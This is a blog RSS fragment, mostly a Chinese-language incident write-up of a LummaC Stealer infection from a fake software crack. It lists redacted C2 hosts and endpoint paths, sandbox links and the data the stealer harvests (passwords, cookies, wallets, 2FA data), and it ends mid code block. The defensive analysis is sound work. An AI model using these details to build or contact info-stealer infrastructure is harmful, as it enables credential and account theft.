&lt;h2 id=&#34;译后记&#34;&gt;&lt;a href=&#34;#译后记&#34; class=&#34;headerlink&#34; title=&#34;译后记 &#34;&gt;&lt;/a&gt;译后记 &lt;a name=&#34;postlude&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;译者的知识水平非常有限，难免有一些错误，希望读者见谅，也欢迎斧正。比如在序言部分对引理的解读是否有失偏颇乃至存在误导？&lt;br&gt;此外，这是我第一次正经翻译文章，所以也期盼在结构、句式、术语上的翻译建议&lt;code&gt;:)&lt;/code&gt;&lt;br&gt;例如，本文将”vantage point”翻译为“视点”，将”cooked up from”翻译为“由……构造而来”，”gives rise to”翻译为“取决于”，不知是否有更优的选择。&lt;br&gt;欢迎交流探讨^_^&lt;/p&gt;
&lt;h2 id=&#34;译者推荐阅读&#34;&gt;&lt;a href=&#34;#译者推荐阅读&#34; class=&#34;headerlink&#34; title=&#34;译者推荐阅读&#34;&gt;&lt;/a&gt;译者推荐阅读&lt;/h2&gt;&lt;p&gt;如果你喜欢可视化或偏直觉的阐释，请务必读一读：&lt;br&gt;&lt;a href=&#34;https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/trackback/&#34;&gt;Category Theory for Programmers: The Preface (by Bartosz Milewski)&lt;/a&gt; （本文对应章节：&lt;a href=&#34;https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/&#34;&gt;The Yoneda Lemma&lt;/a&gt;）&lt;br&gt;偏数学方向的推荐：&lt;br&gt;&lt;a href=&#34;https://www.wwli.asia/downloads/books/Al-jabr-1.pdf&#34;&gt;代数学方法：第一卷（李文威 著）&lt;/a&gt;&lt;br&gt;偏计算机方向的推荐：&lt;br&gt;&lt;a href=&#34;https://people.mpi-sws.org/~dreyer/courses/catlogic/jacobs.pdf&#34;&gt;Categorical Logic and Type Theory (by B. Jacobs)&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/</guid>
            <title>对木马LummaC Stealer样本极简的一次分析</title>
            <link>http://cubicy.icu/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/</link>
            <pubDate>Wed, 22 Nov 2023 17:47:43 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;本文带你通过公开的网站分析捕获的恶意程序。&lt;/p&gt;
&lt;h2 id=&#34;起因&#34;&gt;&lt;a href=&#34;#起因&#34; class=&#34;headerlink&#34; title=&#34;起因&#34;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;电脑被人借用时，下盗版软件下到一个一看就是下崽器的东西，但是估计他没多想，我也没多想。2023-10-15&lt;/p&gt;
&lt;h2 id=&#34;铺垫&#34;&gt;&lt;a href=&#34;#铺垫&#34; class=&#34;headerlink&#34; title=&#34;铺垫&#34;&gt;&lt;/a&gt;铺垫&lt;/h2&gt;&lt;p&gt;火绒日志被清空&lt;/p&gt;
&lt;p&gt;谷歌报恶意软件活动 强制退出&lt;/p&gt;
&lt;p&gt;GitHub被标记为spam&lt;/p&gt;
&lt;p&gt;数字签名的一些驱动被篡改&lt;/p&gt;
&lt;h2 id=&#34;高潮&#34;&gt;&lt;a href=&#34;#高潮&#34; class=&#34;headerlink&#34; title=&#34;高潮&#34;&gt;&lt;/a&gt;高潮&lt;/h2&gt;&lt;p&gt;Steam被盗 2023-11-07&lt;/p&gt;
&lt;p&gt;邮箱被改绑&lt;/p&gt;
&lt;p&gt;追回：找客服撕逼&lt;/p&gt;
&lt;p&gt;事实上，在邮箱里能找到“已删除”的邮件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/1.png&#34; alt=&#34;一分钟内完成验证改绑与删除邮件&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;一分钟内完成验证改绑与删除邮件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/2.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/3.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;诱因-基本情况&#34;&gt;&lt;a href=&#34;#诱因-基本情况&#34; class=&#34;headerlink&#34; title=&#34;诱因&amp;amp;基本情况&#34;&gt;&lt;/a&gt;诱因&amp;amp;基本情况&lt;/h2&gt;&lt;p&gt;病毒文件来源：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://[REDACTED].com/guitar-pro-crack/&#34;&gt;https:&amp;#x2F;&amp;#x2F;[REDACTED].click&amp;#x2F;cgi-sys&amp;#x2F;defaultwebpage.cgi&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;→https:&amp;#x2F;&amp;#x2F;[REDACTED].click&amp;#x2F;?i&amp;#x3D;Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download&amp;amp;u&amp;#x3D;1699615197&amp;amp;t&amp;#x3D;17&lt;/p&gt;
&lt;p&gt;→https:&amp;#x2F;&amp;#x2F;[REDACTED].cfd&amp;#x2F;&lt;/p&gt;
&lt;p&gt;→Passwd.2024.Setap.rar&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;💡 2023-11-11 Update: 文件被更新&lt;br&gt;→&lt;a href=&#34;https://href.li/?https://%5BREDACTED%5D.cfd/?h=rfbnUPMSF5l2DcQuKxs0C7YH61W3ipvtZ&amp;s=17&amp;f=Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download&#34;&gt;https://href.li/?https://[REDACTED].cfd/?h=rfbnUPMSF5l2DcQuKxs0C7YH61W3ipvtZ&amp;amp;s=17&amp;amp;f=Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;线索分析：LummaC2-V4-0&#34;&gt;&lt;a href=&#34;#线索分析：LummaC2-V4-0&#34; class=&#34;headerlink&#34; title=&#34;线索分析：LummaC2 V4.0 ?&#34;&gt;&lt;/a&gt;线索分析：LummaC2 V4.0 ?&lt;/h2&gt;&lt;h3 id=&#34;病毒样本分析结果&#34;&gt;&lt;a href=&#34;#病毒样本分析结果&#34; class=&#34;headerlink&#34; title=&#34;病毒样本分析结果&#34;&gt;&lt;/a&gt;病毒样本分析结果&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/6ea22a21e9815986454f3b9c3dbdea9df158aad847b0620263e7524ea0cef5ba/behavior&#34;&gt;https://www.virustotal.com/gui/file/6ea22a21e9815986454f3b9c3dbdea9df158aad847b0620263e7524ea0cef5ba/behavior&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/8735ce3942864b8031fe311bdb1e77ece23e9f6794953a038484cee3e185bc09/behavior&#34;&gt;https://www.virustotal.com/gui/file/8735ce3942864b8031fe311bdb1e77ece23e9f6794953a038484cee3e185bc09/behavior&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.joesandbox.com/analysis/1293164/0/html&#34;&gt;https://www.joesandbox.com/analysis/1293164/0/html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/4.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;被删除的邮件时间在1min内，且没有用的邮件处于未读状态：提示规模化的自动化利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LummaC Stealer样本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;木马本体编写：俄罗斯（MaaS）&lt;/p&gt;
&lt;p&gt;木马外包装：中国（数字签名）&lt;/p&gt;
&lt;p&gt;木马使用者：乌克兰-文尼察Oblast&lt;/p&gt;
&lt;p&gt;木马的C2网站注册于：2023-10-11&lt;/p&gt;
&lt;p&gt;木马下载于：2023-1015&lt;/p&gt;
&lt;p&gt;样本首次被分析：2023-10-14&lt;/p&gt;
&lt;p&gt;发作日期：至少2023-11-4以前&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://twitter.com/anyrun_app/status/1698643550567579991&#34;&gt;https://twitter.com/anyrun_app/status/1698643550567579991&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇推文指出在其C2服务器的&lt;code&gt;/c2conf&lt;/code&gt; 可以查看其配置。&lt;strong&gt;注意：该木马可以执行携带的payload! 例如EXE, PowerShell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我注意到本机PowerShell的安全等级被设置为”Unrestricted”, 并不是默认的等级危险!!!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;此外木马似乎还请求了另一恶意软件(伪装成&lt;code&gt;clip.exe&lt;/code&gt;)：&lt;a href=&#34;https://bazaar.abuse.ch/sample/fe3f04adc1fb9922ee259a9f355a79bb8cfac741d3490b4372cb80fe287877b1/&#34;&gt;https://bazaar.abuse.ch/sample/fe3f04adc1fb9922ee259a9f355a79bb8cfac741d3490b4372cb80fe287877b1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://app.any.run/tasks/c1bd75b1-c7fd-4d57-86cd-77161313a399/&#34;&gt;https://app.any.run/tasks/c1bd75b1-c7fd-4d57-86cd-77161313a399/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;提示&lt;strong&gt;RaccoonStealer， 但也有可能是Amadey：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/&#34;&gt;https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我怀疑这个被检测出虚拟环境了直接crash了。&lt;/p&gt;
&lt;p&gt;相比之下是比较粗糙的一个。&lt;/p&gt;
&lt;p&gt;本事件中没有执行恶意指令似乎，也许是C2没有下发命令。AnyRun这个在10-25才有的记录&lt;/p&gt;
&lt;p&gt;没有网络连接，但是设置计划任务以实现持久化(远程控制？)。&lt;/p&gt;
&lt;h3 id=&#34;对LummaC-Stealer已有的分析&#34;&gt;&lt;a href=&#34;#对LummaC-Stealer已有的分析&#34; class=&#34;headerlink&#34; title=&#34;对LummaC Stealer已有的分析&#34;&gt;&lt;/a&gt;对LummaC Stealer已有的分析&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.esentire.com/blog/the-case-of-lummac2-v4-0&#34;&gt;https://www.esentire.com/blog/the-case-of-lummac2-v4-0&lt;/a&gt; （最贴合的）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ja.darktrace.com/blog/the-rise-of-the-lumma-info-stealer&#34;&gt;https://ja.darktrace.com/blog/the-rise-of-the-lumma-info-stealer&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blogs.vmware.com/security/2023/10/an-ilummanation-on-lummastealer.html&#34;&gt;https://blogs.vmware.com/security/2023/10/an-ilummanation-on-lummastealer.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://twitter.com/anyrun_app/status/1698643550567579991&#34;&gt;https://twitter.com/anyrun_app/status/1698643550567579991&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://asec.ahnlab.com/en/50594/&#34;&gt;https://asec.ahnlab.com/en/50594/&lt;/a&gt; (还真是主要靠虚假的破解软件传播)&lt;/p&gt;
&lt;h3 id=&#34;利用脚本分析&#34;&gt;&lt;a href=&#34;#利用脚本分析&#34; class=&#34;headerlink&#34; title=&#34;利用脚本分析&#34;&gt;&lt;/a&gt;利用脚本分析&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/esThreatIntelligence/RussianPanda_tools/blob/main/lummac2_config_extractor_build.py&#34;&gt;https://github.com/esThreatIntelligence/RussianPanda_tools/blob/main/lummac2_config_extractor_build.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/esThreatIntelligence/RussianPanda/blob/main/lummac2_fetch_config_from_C2.py&#34;&gt;https://github.com/esThreatIntelligence/RussianPanda/blob/main/lummac2_fetch_config_from_C2.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;没有找到。这可能证实其使用C2服务器下发配置而非像老版本嵌入。&lt;/p&gt;
&lt;p&gt;但是在Finsin的网站中找到了类似的URL，&lt;/p&gt;
&lt;p&gt;包含&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://[REDACTED].fun/&#34;&gt;http:&amp;#x2F;&amp;#x2F;[REDACTED].fun&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://[REDACTED].pw/&#34;&gt;http:&amp;#x2F;&amp;#x2F;[REDACTED].pw&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;等。&lt;/p&gt;
&lt;p&gt;这些Host似乎出自同一主体。好消息：&lt;strong&gt;只要找到其中一个正在工作的服务器，我们至少可以知道对方做了什么！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们尝试发包：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/5.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/6.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/7.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/8.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/9.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;本次的样本对应C2服务器: [REDACTED].fun&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/api&lt;/code&gt; &lt;code&gt;/c2conf&lt;/code&gt; &lt;code&gt;/c2sock&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;沙盒分析&#34;&gt;&lt;a href=&#34;#沙盒分析&#34; class=&#34;headerlink&#34; title=&#34;沙盒分析&#34;&gt;&lt;/a&gt;沙盒分析&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://app.any.run/tasks/e66e2b32-73ae-4962-95e2-98c143fba6e4&#34;&gt;https://app.any.run/tasks/e66e2b32-73ae-4962-95e2-98c143fba6e4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;没有什么收获。因为C&amp;amp;C Server Down了&lt;/p&gt;
&lt;p&gt;C2配置：（见文末）&lt;/p&gt;
&lt;p&gt;可以看出目标有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户目录下的txt文件&lt;/li&gt;
&lt;li&gt;用户目录下文件名含有&lt;code&gt;key&lt;/code&gt; 的文件&lt;/li&gt;
&lt;li&gt;用户目录下可能是加密货币敏感信息的相关文件&lt;/li&gt;
&lt;li&gt;浏览器中加密货币的插件&lt;strong&gt;（确认泄露）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;两步验证软件数据&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;浏览器数据、&lt;strong&gt;自动填充和密码管理器中的数据（确认泄露）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;浏览器&lt;strong&gt;所有历史记录（确认泄露）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steam账户敏感数据（确认泄露）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Telegram账号敏感数据（确认泄露）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;环境信息：进程、系统、硬件、已安装软件&lt;strong&gt;（确认泄露）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;事实上还可能包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文档目录中的图片&lt;/li&gt;
&lt;li&gt;注入正在运行的进程实现可持久化&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但就这次来看，攻击者选择捞一波就结束。&lt;/p&gt;
&lt;p&gt;窃取的信息以&lt;code&gt;.zip&lt;/code&gt; 格式上传，内容示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/10.png&#34; alt=&#34;安装的软件&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装的软件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/11.png&#34; alt=&#34;进程，最后两个即为病毒&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;进程，最后两个即为病毒&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/12.png&#34; alt=&#34;系统信息与Lumma标识符&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;系统信息与Lumma标识符&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/13.png&#34; alt=&#34;浏览器敏感信息&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;浏览器敏感信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/14.png&#34; alt=&#34;密码，自动填充信息，历史记录，网页数据，Cookie&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;密码，自动填充信息，历史记录，网页数据，Cookie&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/15.png&#34; alt=&#34;浏览器日志&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;浏览器日志&lt;/p&gt;
&lt;p&gt;推论：该木马植入后门后，进行规模化的自动化利用，且主要用于获取直接经济利益。&lt;/p&gt;
&lt;p&gt;比较遗憾的一点是当时没及时查看c2conf具体的配置，不清楚具体的目标。也没想去any.run上跑一下看看。&lt;/p&gt;
&lt;p&gt;其实该配置文件开头是&lt;strong&gt;32-byte的XOR密钥，CyberChef就能秒掉&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;搜索该C2服务器，在一个安全研究组织的网站上找到了唯一的结果：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ioc.finsin.cl/Output_FINSIN_URL&#34;&gt;https://ioc.finsin.cl/Output_FINSIN_URL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;搜索&lt;code&gt;/c2conf&lt;/code&gt; &lt;code&gt;/api&lt;/code&gt;可以看到并非孤例，注册者均类似，怀疑出自同一主体。&lt;/p&gt;
&lt;p&gt;但是，本次样本是&lt;code&gt;/api&lt;/code&gt; ，&lt;del&gt;不清楚为何&lt;/del&gt;(更换了新的Endpoint)。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://twitter.com/g0njxa/status/1702444978503360989&#34;&gt;https://twitter.com/g0njxa/status/1702444978503360989&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;考虑到这是MaaS且攻击者表现出了很低的专业性（未清空已删除邮件），有理由怀疑使用的是木马发布者的预设。&lt;/p&gt;
&lt;h2 id=&#34;措施&#34;&gt;&lt;a href=&#34;#措施&#34; class=&#34;headerlink&#34; title=&#34;措施&#34;&gt;&lt;/a&gt;措施&lt;/h2&gt;&lt;p&gt;重置密码管理器中的&lt;strong&gt;所有&lt;/strong&gt;密码（有效的约30个）&lt;/p&gt;
&lt;p&gt;网络账号登出其他设备&lt;/p&gt;
&lt;p&gt;废弃所有私钥（3个）&lt;/p&gt;
&lt;p&gt;更改邮箱密码&lt;/p&gt;
&lt;p&gt;Steam两步验证（这次只有它受伤，因为只有Valve特立独行搞个自己的两步验证然后验证码收不到）&lt;/p&gt;
&lt;p&gt;禁用PowerShell执行，破坏PowerShell用于利用的库&lt;/p&gt;
&lt;p&gt;检查注册表与计划任务相关项（尤其是在沙盒中有可疑修改迹象的对象、Entry）&lt;/p&gt;
&lt;p&gt;禁止IoC中的域名、IP等&lt;/p&gt;
&lt;p&gt;清除浏览器缓存与Cookie&lt;/p&gt;
&lt;p&gt;删除&lt;code&gt;%TEMP%&lt;/code&gt;目录下的所有.exe&lt;/p&gt;
&lt;p&gt;删除&lt;code&gt;%USERPROFILE%&lt;/code&gt; &lt;code&gt;%APPDATA%&lt;/code&gt; &lt;code&gt;%LOCALAPPDATA%&lt;/code&gt;对应的在沙箱中被读写的文件&lt;/p&gt;
&lt;p&gt;“快去叫360老将来！”&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;对网络安全心存敬畏！注意保护好自己的硬件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Punch line: 中国组织用俄罗斯的木马包装了一个钓鱼安装包卖给乌克兰人在冰岛网站上钓鱼并且在靶机上放了个后门与美国服务器联通 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这次非常侥幸！电脑娱乐用，不和干活机子混用所以没有敏感信息；其上没有两步验证软件或者虚拟货币钱包；绝大部分的后渗透也被两步验证拦下了。&lt;/p&gt;
&lt;p&gt;至少目前看来，C2服务器被Cloudflare拿下，也确实Down了。沙盒里没有展现其他的C2服务器连接。除非安置了别的后门，否则应该是安全的。&lt;/p&gt;
&lt;p&gt;信息泄露是不可逆的，惨痛教训+1&lt;/p&gt;
&lt;p&gt;几乎一致的样本（连压缩包都是一个名字）：&lt;a href=&#34;https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/#&#34;&gt;https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/#&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不过这个似乎被木马认出来在虚拟环境里，自己crash掉了。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;完全吻合的分析：&lt;a href=&#34;https://www.esentire.com/blog/the-case-of-lummac2-v4-0&#34;&gt;https://www.esentire.com/blog/the-case-of-lummac2-v4-0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;技术分析：&lt;a href=&#34;https://www.intrinsec.com/wp-content/uploads/2023/10/TLP-CLEAR-Lumma-Stealer-EN-Information-report.pdf&#34;&gt;https://www.intrinsec.com/wp-content/uploads/2023/10/TLP-CLEAR-Lumma-Stealer-EN-Information-report.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;已经可以说实锤了。&lt;/p&gt;
&lt;p&gt;顺带一提Any.Run真是好东西，学校邮箱可以注册。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;疑似同一攻击者的C2 配置，看得出来完全就是预设&lt;/p&gt;
  &lt;figure class=&#34;highlight json&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span 